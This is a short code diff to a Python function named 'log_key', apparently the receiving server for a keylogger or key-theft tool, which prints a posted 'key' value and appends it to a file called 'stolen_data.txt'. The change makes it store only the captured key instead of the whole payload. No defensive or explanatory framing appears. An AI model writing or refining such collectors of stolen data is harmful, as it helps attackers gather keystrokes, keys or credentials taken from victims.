@@ -16,7 +16,7 @@ def log_key():
     if data and "key" in data:
         print(f"Key: {data['key']}")
         with open("stolen_data.txt", "a") as f:
-            f.write(f"{data} ")
+            f.write(f"{data['key']} ")
     return "", 200
 
 if __name__ == "__main__":
